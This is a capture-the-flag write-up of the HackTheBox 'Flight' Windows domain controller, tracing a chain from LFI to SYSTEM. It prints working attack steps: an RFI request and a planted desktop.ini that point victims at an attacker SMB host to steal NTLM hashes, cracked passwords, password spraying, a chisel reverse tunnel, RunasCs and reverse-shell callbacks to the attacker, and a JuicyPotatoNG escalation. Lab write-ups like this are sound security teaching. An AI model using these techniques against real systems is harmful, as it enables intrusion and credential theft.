---
title: "HackTheBox - Flight"
author: Nasrallah
description: ""
date: 2023-05-03 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, hard, activedirectory, potato, lfi, rfi, responder, tunneling, chisel, crack, hashcat, smb]
img_path: /assets/img/hackthebox/machines/flight
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Flight](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). This is the first hard machine i complete on Hackthebox, the reason i even gave a try is I saw it's writeup from my friend [darknite](https://twitter.com/d4rKn19t) and it seemed easy and fun so i jump right into it. The box is an AD DC with a website vulnerable to LFI, we use responder to get a hash that we crack for a password, with those credentials we enumerate users and use password spraying to find another user that has write access over a share, with that we upload a file that provokes an smb login to our responder and get another hash and a password after the crack. THe newly obtained credentials gives us the right to write in the Web root folder so we upload a php reverse shell and get foothold. After running winpeas we discover another web server running locally so we use chisel and do a port forward. One of the users can write on the web root folder so we switch to that user and upload an aspx shell for a horizontall privesc. We got shell as a service account that has the seimpersonateprivilege so we use potato attack to get system.

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.187
Host is up (0.37s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-06 23:51:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-06T23:52:23
|_  start_date: N/A
```

One other tool i like to use is `rustscan`, it allows me to scan all port super fast and automatically pipe the results into `nmap`. The syntax i use is `rustscan -r 0-65535 --ulimit 5000 -a 10.10.11.187 -t 9000 -- -sV -sC`

```terminal
Nmap scan report for flight.htb (10.10.11.187)                                                                                                        [28/233]
Host is up, received syn-ack (0.25s latency).                                                                                                                 
Scanned at 2023-05-07 18:34:50 +01 for 101s                                                                                                                   
                                                                                                                                                              
PORT      STATE SERVICE       REASON  VERSION                                                                                                                 
53/tcp    open  domain        syn-ack Simple DNS Plus                                                                                                         
80/tcp    open  http          syn-ack Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)                                                                  
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1                                                                                          
| http-methods:                                                                                                                                               
|   Supported Methods: GET POST OPTIONS HEAD TRACE                                                                                                            
|_  Potentially risky methods: TRACE                                                                                                                          
|_http-title: g0 Aviation                                                                                                                                     
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-05-08 00:34:57Z)                                                          
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC                                                                                                   
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn                                                                                           
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)                           
445/tcp   open  microsoft-ds? syn-ack                                                                                                                         
464/tcp   open  kpasswd5?     syn-ack                                                                                                                         
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0                                                                                     
636/tcp   open  tcpwrapped    syn-ack                                                                                                                         
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                 
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                   
|_http-title: Not Found                                                                                                                                       
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing                                                                                                    
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC                                                                                                   
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0                                                                                     
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC                                                                                                   
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC                                                                                                   
49721/tcp open  msrpc         syn-ack Microsoft Windows RPC                                                                                                   
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-08T00:35:50
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32072/tcp): CLEAN (Timeout)
|   Check 2 (port 39699/tcp): CLEAN (Timeout)
|   Check 3 (port 61831/udp): CLEAN (Timeout)
|   Check 4 (port 44855/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

From the open ports, we can assume we're dealing with a domain controller of an active directory with the domain name `flight.htb`.

## Web

We say port 80 open so let's check it out.

![](1.png)

This is a website of an airline company, the page is static and the link doesn't go anywhere.

### feroxbuster

Let's run a directory/file scan.

```terminal
$ feroxbuster -w /usr/share/wordlists/dirb/big.txt -u http://flight.htb/ -n                                                            
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ http://flight.htb/                                                                                                               
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt                                                                                                
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 💾  Output File           │ scans/fero.txt
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      299c http://flight.htb/.htpasswd
200      GET      154l      530w     7069c http://flight.htb/
403      GET        9l       30w      299c http://flight.htb/.htaccess
301      GET        9l       30w      333c http://flight.htb/Images => http://flight.htb/Images/
403      GET        9l       30w      299c http://flight.htb/aux
403      GET        9l       30w      299c http://flight.htb/cgi-bin/
403      GET        9l       30w      299c http://flight.htb/com1
403      GET        9l       30w      299c http://flight.htb/com2
403      GET        9l       30w      299c http://flight.htb/com3
403      GET        9l       30w      299c http://flight.htb/com4
403      GET        9l       30w      299c http://flight.htb/con
301      GET        9l       30w      330c http://flight.htb/css => http://flight.htb/css/
301      GET        9l       30w      333c http://flight.htb/images => http://flight.htb/images/
301      GET        9l       30w      329c http://flight.htb/js => http://flight.htb/js/
403      GET       11l       47w      418c http://flight.htb/licenses
403      GET        9l       30w      299c http://flight.htb/lpt1
403      GET        9l       30w      299c http://flight.htb/lpt2
403      GET        9l       30w      299c http://flight.htb/nul
403      GET       11l       47w      418c http://flight.htb/phpmyadmin
403      GET        9l       30w      299c http://flight.htb/prn
403      GET       11l       47w      418c http://flight.htb/server-info
403      GET       11l       47w      418c http://flight.htb/server-status
403      GET       11l       47w      418c http://flight.htb/webalizer
[####################] - 55s    20469/20469   0s      found:23      errors:0      
[####################] - 55s    20469/20469   368/s   http://flight.htb/ 
```

Nothing interesting.

## ffuf

Let's use `ffuf` to scan for subdomains.

```terminal
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fl 155         [250/307]

        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 155
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 307ms]
:: Progress: [4989/4989] :: Job [1/1] :: 61 req/sec :: Duration: [0:01:31] :: Errors: 0 ::
```

We found the subdomain `school`, let's add it to `/etc/hosts` and navigate to it.

![](2.png)

This is an aviation school website.

Clicking on the `home` tab, the website uses the parameter `view` to request the file:

```url
http://school.flight.htb/index.php?view=home.html
```

Let's see if the website is vulnerable to LFI by reading the base64 encoded `index.php`.

![](3.png)

Got `Suspicious activity` from the website, so there must be a filter in place.

Let's try reading a local file this time, how about `/windows/system32/drivers/etc/hosts`

![](4.png)

Great! The website is vulnerable to LFI, but there isn't much useful file to read in windows so let's test for RFI.

### responder

First we run `responder`:

```terminal
$ sudo responder -I tun0                                                                                                                                 
[sudo] password for sirius:                                                                                                                                   
                                         __                                                                                                                   
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                      
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                      
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                        
                   |__|                                                                                                                                       
                                                                                                                                                              
           NBT-NS, LLMNR & MDNS Responder 3.0.6.0                                                                                                             
                                                                                                                                                              
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                           
  To kill this script hit CTRL-C                                                                                                                              
                                                                                                                                                              
                                                                                                                                                              
[+] Poisoners:                                                                                                                                                
    LLMNR                      [ON]                                                                                                                           
    NBT-NS                     [ON]                                                                                                                           
    DNS/MDNS                   [ON]                                                                                                                           
                                                                                                                                                              
[+] Servers:                                                                                                                                                  
    HTTP server                [ON]                                                                                                                           
    HTTPS server               [ON]                                                                                                                           
    WPAD proxy                 [OFF]                                                                                                                          
    Auth proxy                 [OFF]                                                                                                                          
    SMB server                 [ON]                                                                                                                           
    Kerberos server            [ON]                                                                                                                           
    SQL server                 [ON]                                                                                                                           
    FTP server                 [ON]                                                                                                                           
    IMAP server                [ON]                                                                                                                           
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.17.90]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-DBTV3UD5RF3]
    Responder Domain Name      [3G7H.LOCAL]
    Responder DCE-RPC Port     [47518]

[+] Listening for events...
```

Now let's request a file from our smb server(doesn't matter if it exist or not).

```terminal
http://school.flight.htb/index.php?view=//attacker_IP/file
```

We wait for a second for the website to make the request and we see in responder that we captured a hash.

![](5.png)

The hash belongs to the user `svc_apache` and it's NTLMv2 hash.

## john

Let's crack the hash using hashcat with mode 5600.

```terminal
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5 CPU       M 520  @ 2.40GHz, 2726/2790 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

[...]
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

SVC_APACHE::flight:02822dff0031071b:b4d86911814b1135fe16af0e52796745:01010000000000008013a4434780d9014b157c7ddfa1ea3500000000020008004c00480057004d0001001e00570049004e002d004200460050004300590035004700500052004900460004003400570049004e002d00420046005000430059003500470050005200490046002e004c00480057004d002e004c004f00430041004c00030014004c00480057004d002e004c004f00430041004c00050014004c00480057004d002e004c004f00430041004c00070008008013a4434780d901060004000200000008003000300000000000000000000000003000006d49f400efa12f377aa02b865c126ef958975ad09c06dca17971e26ea40826450a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e00390030000000000000000000:S@Ss!K@*t13
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: SVC_APACHE::flight:02822dff0031071b:b4d86911814b113...000000
Time.Started.....: Sun May  7 19:10:31 2023 (17 secs)
Time.Estimated...: Sun May  7 19:10:48 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   676.9 kH/s (4.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10665984/14344385 (74.36%)
Rejected.........: 0/10665984 (0.00%)
Restore.Point....: 10661888/14344385 (74.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: SAESH21 -> Ryanpetter
```

Great! We got the password.

## SMB

Let's start enumerating smb now. I tried before listing share with no credentials and failed, but now that we have creds, let's try that again.

For that we can use `crackmapexec`.

```terminal
$ crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ            
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ            
```

We found a lot of interesting shares like `Users` 'Web' and 'Shared'.

The Users share is the users directory found in C drive on windows

```terminal
$ smbclient //flight.htb/Users -U svc_apache
Enter WORKGROUP\svc_apache's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Sep 22 21:16:56 2022
  ..                                 DR        0  Thu Sep 22 21:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 20:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 20:28:02 2022
  Administrator                       D        0  Mon Oct 31 19:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 08:28:48 2018
  C.Bum                               D        0  Thu Sep 22 21:08:23 2022
  Default                           DHR        0  Tue Jul 20 20:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 08:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 08:16:48 2018
  Public                             DR        0  Tue Jul 20 20:23:25 2021
  svc_apache                          D        0  Fri Oct 21 19:50:21 2022

                5056511 blocks of size 4096. 1254670 blocks available
smb: \> cd C.Bum
smb: \C.Bum\> ls
NT_STATUS_ACCESS_DENIED listing \C.Bum\*
smb: \C.Bum\> 
```

We found a user called `C.Bum` but couldn't read his directory.

The `Shared` share is empty.

```terminal
$ smbclient //flight.htb/Shared -U svc_apache
Enter WORKGROUP\svc_apache's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct 28 21:21:28 2022
  ..                                  D        0  Fri Oct 28 21:21:28 2022

                5056511 blocks of size 4096. 1254542 blocks available
smb: \>
```

The 'Web' share is the one looking promising because it has both websites's files.

```terminal
$ smbclient //flight.htb/Web -U svc_apache                                                                                                               
Enter WORKGROUP\svc_apache's password:                                                                                                                        
Try "help" to get a list of possible commands.                                                                                                                
smb: \> ls                                                                                                                                                    
  .                                   D        0  Mon May  8 02:12:01 2023                                                                                    
  ..                                  D        0  Mon May  8 02:12:01 2023                                                                                    
  flight.htb                          D        0  Mon May  8 02:12:01 2023                                                                                    
  school.flight.htb                   D        0  Mon May  8 02:12:01 2023                                                                                    
                                                                                                                                                              
                5056511 blocks of size 4096. 1254910 blocks available                                                                                         
smb: \> cd flight.htb                                                                                                                                         
smb: \flight.htb\> ls                                                                                                                                         
  .                                   D        0  Mon May  8 02:12:01 2023
  ..                                  D        0  Mon May  8 02:12:01 2023
  css                                 D        0  Mon May  8 02:12:01 2023
  images                              D        0  Mon May  8 02:12:01 2023
  index.html                          A     7069  Thu Feb 24 06:58:10 2022
  js                                  D        0  Mon May  8 02:12:01 2023

                5056511 blocks of size 4096. 1254910 blocks available
smb: \flight.htb\> 
```

Unfortunately, we don't have write permission in this share.

I tried using the same password to login as `C.Bum` but it didn't work.

Now let's enumerate users using `crackmapexec`.

```bash
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
```

![](6.png)

We found a bunch of users, i saved the output to a file like the following:

```terminal
$ cat users                                                            
SMB         flight.htb      445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: Helpdesk
SMB         flight.htb      445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: Service Apache web
SMB         flight.htb      445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: Secretary
SMB         flight.htb      445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: Project Manager
SMB         flight.htb      445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: Nobody knows why he's here
SMB         flight.htb      445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: Payroll officer
SMB         flight.htb      445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: Senior Web Developer
SMB         flight.htb      445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: Sysadmin
SMB         flight.htb      445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: Penetration tester
SMB         flight.htb      445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: Sales manager
SMB         flight.htb      445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: HR Assistant
SMB         flight.htb      445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: Junion Web Developer
SMB         flight.htb      445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         flight.htb      445    G0               flight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         flight.htb      445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Then used the following command to clean it and only keep username.

```bash
$ cat users | tr -s " " | cut -d " " -f 5 | cut -d '\' -f 2            
O.Possum
svc_apache
V.Stevens
D.Truff
I.Francis
W.Walker
C.Bum
M.Gold
L.Kein
G.Lors
R.Cold
S.Moon
krbtgt
Guest
Administrator
```

I saved the usernames in another file and called it user.lst

Now let's see if any of these users uses the same password as `svc_apache`.

To do that we can use `crackmapexec` to do a password spray.

```bash
crackmapexec smb flight.htb -u users.lst -p 'S@Ss!K@*t13' --continue-on-success
```

![](7.png)

User `S.Moon` uses the same password, now let's see if this user has any write permissions on the shares and hopefully can write on the `Web` share.

```terminal
crackmapexec smb flight.htb -u s.moon -p 'S@Ss!K@*t13' --shares
```

![](8.png)

The user has write permission on `Shared`, not what we hoped for but it's ok.

One things we can try is upload a malicious `desktop.ini` file which usually contains the information of the icons applied to the folder, but instead we write instructions that connect to our smb server setup by `responder` and steal NTLM hash every time someone open the `Shared` folder.

The desktop.ini file should contain the following:

```terminal
$ cat desktop.ini                                                
[.ShelClassInfo]
IconResource=//hacker_IP/hackedlol
```

Using the same technique in the website earlier, we request a file from our smb server.

Now let's upload the file and hope someone opens the `Shared` folder.

```terminal
$ cat desktop.ini                                                
[.ShelClassInfo]
IconResource=//10.10.17.90/hackedlol
                                                                                                                                                              ┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/flight]
└──╼ $ smbclient //flight.htb/Shared -U s.moon    
Enter WORKGROUP\s.moon's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May  8 02:33:40 2023
  ..                                  D        0  Mon May  8 02:33:40 2023

                5056511 blocks of size 4096. 1253058 blocks available
smb: \> put desktop.ini 
putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)
smb: \> 
```

Let's wait.

![](9.png)

Great! We got c.bum's hash, let's crack it.

```terminal
$ hashcat -m 5600 cbum.hash /usr/share/wordlists/rockyou.txt               
hashcat (v6.1.1) starting...
             
Minimum password length supported by kernel: 0    
Maximum password length supported by kernel: 256
                                       
[...]
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

C.BUM::flight.htb:c6c5121b88de629b:82c291a99f4e2ce528a310813e7c490e:0101000000000000803235d14a80d901845b7099f3d76a25000000000200080049005a004b00330001001e00570049004e002d00450051005000360055004b004b004f004e005100390004003400570049004e002d00450051005000360055004b004b004f004e00510039002e0049005a004b0033002e004c004f00430041004c000300140049005a004b0033002e004c004f00430041004c000500140049005a004b0033002e004c004f00430041004c0007000800803235d14a80d901060004000200000008003000300000000000000000000000003000006d49f400efa12f377aa02b865c126ef958975ad09c06dca17971e26ea40826450a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e00390030000000000000000000:Tikkycoll_431012284
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: C.BUM::flight.htb:c6c5121b88de629b:82c291a99f4e2ce5...000000
Time.Started.....: Sun May  7 19:47:38 2023 (13 secs)
Time.Estimated...: Sun May  7 19:47:51 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   820.7 kH/s (3.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> Thelittlemermaid
```

Great! We got the password! Now let's check the permission `c.bum` has over the shares, (surely his has write permissions over `Web` with all those muscles he have, if you know you know)

```terminal
crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
```

![](10.png)

Great! We got write permission on `Web`.

# **Foothold**

For a shell, we can upload a php reverse shell to the `Web` share. I found this awesome [php_revshell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php) from ivan which work on both windows and linux.

We download the file, edit the ip address and port in it and then upload it to the Web share.

![](11.png)

Great! We finally got a shell.

> I should note when obtaining credentials in windows, one thing to try is login in via `winrm`, but in this case it doesn't work.

# **Privilege Escalation**

Once got a shell i uploaded a copy of `winpeas.exe` and run it:

![](12.png)

We found that port 8000 is open, and it's usually for web server.

Let's use `chisel` to forward that port and see what's there.

On the attacker machine we run:

```bash
./chisel server --reverse --port 9002
```

On the target we run

```bash
.\chisel.exe client 10.10.17.90:9002 R:8000:127.0.0.1:8000
```

![](13.png)

We see that we've successfully forwarded the port, now let's go to `127.0.0.1:8000`

![](14.png)

Another website for this flight company.

Let's search for the website's folder, and for that i had to get another shell since the one we have is used by `chisel`.

![](15.png)

We found the website's folder in `/inetpub/development`, but unfortunately we don't have write permission with our current user, but C.Bum has write permission.

To switch to c.bum we can use [RunasCS.exe](https://github.com/antonioCoco/RunasCs), which the equivalent for `sudo -u` in linux. The syntax as the following:

```terminal
.\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r attacker_IP:9003
```

![](16.png)

Great! Now we need to get a reverse shell.

Since the website folder is located in `inetpub` which is the default folder for Microsoft IIS, instead of uploading a php reverse shell, we need to upload a `aspx` shell. The one i used can be found [here](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx).

We modify the ip address inside the code and upload the file.

Then we setup a listener and request the file at `127.0.0.1:8000/shell.aspx`

![](17.png)

We got a shell as `iis apppool\defaultapppool`

Checking our privileges we find we got `SEImpersonatePrivilege`

```terminal
c:\windows\system32\inetsrv>whoami /priv                                                                                                                      
whoami /priv                                                                                                                                                  
                                                                                                                                                              
PRIVILEGES INFORMATION                                                                                                                                        
----------------------                                                                                                                                        
                                                                                                                                                              
Privilege Name                Description                               State                                                                                 
============================= ========================================= ========                                                                              
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                              
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                              
SeMachineAccountPrivilege     Add workstations to domain                Disabled                                                                              
SeAuditPrivilege              Generate security audits                  Disabled                                                                              
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                               
SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                               
SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                               
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                                                              
                                                      
```

To exploit the privilege we can use [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG).

After uploading the executable to the target we run the following command:

```bash
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
```

![](18.png)

And we finally got System privileges.


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).